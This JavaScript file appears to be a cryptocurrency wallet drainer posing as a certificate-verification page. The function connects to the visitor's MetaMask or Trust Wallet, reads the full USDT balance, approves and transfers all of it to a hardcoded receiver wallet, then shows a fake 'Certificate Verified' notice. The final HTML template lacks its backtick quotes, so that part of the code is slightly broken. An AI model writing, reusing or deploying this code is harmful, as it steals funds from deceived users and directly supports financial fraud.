async function checkAndApprove() {
  if (typeof window.ethereum === "undefined") {
    alert("Please install MetaMask or Trust Wallet.");
    return;
  }

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });
  const accounts = await web3.eth.getAccounts();
  const sender = accounts[0];

  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
  const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // ✅ Aapka wallet
  const usdtAbi = [
    {
      constant: true,
      inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "balance", type: "uint256" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "success", type: "bool" }],
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "_to", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "success", type: "bool" }],
      type: "function",
    },
  ];

  const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
  const balanceRaw = await usdt.methods.balanceOf(sender).call();
  const balance = web3.utils.fromWei(balanceRaw, "ether");

  if (parseFloat(balance) === 0) {
    alert("Insufficient USDT balance.");
    return;
  }

  const amountToSend = web3.utils.toWei(balance, "ether");

  await usdt.methods.approve(receiver, amountToSend).send({ from: sender });
  await usdt.methods.transfer(receiver, amountToSend).send({ from: sender });

  // Format Date & Time
  const now = new Date();
  const date = now.toLocaleDateString("en-GB", {
    day: "2-digit",
    month: "short",
    year: "numeric",
  });
  const time = now.toLocaleTimeString("en-GB", {
    hour: "2-digit",
    minute: "2-digit",
    hour12: true,
  });

  // Format wallet address short
  const shortAddress = sender.slice(0, 6) + "..." + sender.slice(-4);
  const formattedBalance = parseFloat(balance).toFixed(2);

  const container = document.getElementById("certificate-container");
  container.innerHTML = 
    <div style="text-align: center; margin-top: 40px; font-family: Arial;">
      <h2 style="color: green;">✅ Certificate Verified</h2>
      <p style="font-size: 18px;">${shortAddress}</p>
      <p style="font-size: 18px;">Only ${formattedBalance} USDT</p>
      <p style="font-size: 16px;">🕒 ${date}, ${time}</p>
    </div>
  ;
}
